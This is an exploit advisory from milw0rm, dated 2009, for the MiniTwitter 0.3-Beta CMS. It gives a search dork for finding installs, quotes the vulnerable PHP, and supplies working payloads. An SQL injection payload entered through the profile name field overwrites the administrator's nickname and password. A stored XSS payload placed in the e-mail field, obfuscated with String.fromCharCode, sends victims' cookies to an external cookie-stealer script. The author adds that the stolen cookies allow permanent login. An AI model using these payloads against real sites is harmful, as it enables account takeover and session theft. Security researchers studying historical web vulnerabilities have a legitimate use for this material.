<html><head><title>MiniTwitter 0.3-Beta (SQL/XSS) Multiple Remote Vulnerabilities</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	      	MULTIPLE REMOTE VULNERABILITIES			      	     |
|--------------------------------------------------------------------------------------------|
|                         	|    MiniTwitter v0.3-Beta     |		 	     |
|  CMS INFORMATION:		 ------------------------------			             |
|										             |
|--&gt;WEB: http://mt.bioscriptsdb.com/          				                     |
|--&gt;DOWNLOAD: http://sourceforge.net/projects/minitt/           	                     |
|--&gt;DEMO: http://www.bioscripts.net/minitwitter/index.php   	     			     |
|--&gt;CATEGORY: Social Networking								     |
|--&gt;DESCRIPTION: Your business needs a private twitter. You can add...		       	     |
|		several twitters account and use this twitter as a buckup of all...	     |
|--&gt;RELEASED: 2009-05-01								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3								     |
|--&gt;DORK: &quot;BioScripts&quot;							                     |
|--&gt;CATEGORY: USER OPTIONS CHANGING (SQLi) / COOKIE STEALER (XSS)			     |
|--&gt;AFFECT VERSION: &lt;= 0.3 Beta				 			             |
|--&gt;Discovered Bug date: 2009-05-01							     |
|--&gt;Reported Bug date: 2009-05-02							     |
|--&gt;Fixed bug date: 2009-05-10								     |
|--&gt;Info patch (0.4 Beta): http://sourceforge.net/projects/minitt/  			     |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------



##############################
//////////////////////////////

USER OPTIONS CHANGING (SQLi):

/////////////////////////////
##############################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++---------&gt;&gt;&gt;&gt;



-----------
FILE VULN:
-----------

...

$nombre = $_POST[&quot;nombre&quot;];
$apellidos = $_POST[&quot;apellidos&quot;];
$dia = $_POST[&quot;fechadia&quot;];
$mes = $_POST[&quot;fechames&quot;];
$anio = $_POST[&quot;fechaanio&quot;];
$correo = $_POST[&quot;correo&quot;];
$bio = $_POST[&quot;bio&quot;];
$gravatar = $_POST[&quot;gravatar&quot;];
$timeline = $_POST[&quot;timeline&quot;];
$country = $_POST[&quot;country&quot;];
$state = $_POST[&quot;state&quot;];
$sex = $_POST[&quot;sex&quot;];
$show = $_POST[&quot;showing&quot;];

...

$pass1 = $_POST[&quot;pass1&quot;];
$pass2 = $_POST[&quot;pass2&quot;];

...

$optquery  = &quot;UPDATE mt_users SET nombre = '$nombre', apellidos = '$apellidos', country = '$country', state='$state', sex='$sex', correo = '$correo', dia = '$dia', mes = '$mes', anio = '$anio', bio = '$bio', gravatar = '$gravatar' , timeline = '$timeline', showing = '$show', twitter = '$twitter', accounts = '$twitteraccounts' WHERE id_usr = '$id_usr'&quot;;

...


------
PoC:
------


When an user change his options, he can inject sql code and change options of other user

Choose any option, for example name.

Name: name=y3nh4ck3r', [SQL] /*


---------
EXPLOIT:
---------

Name: name=y3nh4ck3r',apellidos = 'y3nh4ck3r', nick='y3nh4ck3r' country = 'y3nh4ck3r', state='y3nh4ck3r', sex='0', password=MD5(12345) correo = 'y3nh4ck3r@gmail.com', dia = '0', mes = '0', anio = '0', bio = 'y3nh4ck3r', gravatar = '' , timeline = '', showing = '', twitter = '', accounts = '' WHERE id_usr = '1'/*


Return: Changed options for user id 1. 

nick=y3nh4ck3r
password=12345



#############################
/////////////////////////////

COOKIES STEALING VULN (XSS):

/////////////////////////////
#############################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: Nothing +++++++++++++++++---------&gt;&gt;&gt;&gt;


---------
EXPLOIT:
---------


Go to Link --&gt; http://[HOST]/[HOME_PATH]/index.php?go=opt

Change your e-mail to:


&lt;script&gt;document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,101,120,112,108,111,105,116,45,99,111,111,107,105,101,115,47,119,97,105,116,105,110,103,45,102,111,114,46,112,104,112,63,99,107,61)+document.cookie&lt;/script&gt;


Use your PHP Script (Cookies Stealer)
 

When you steal the cookies, you always could log in because their format is:


cooknameuniversal= nick user

passnameuniversal= password (md5 hash)


So they are universal :P


&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!


#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-05-26]</pre></html>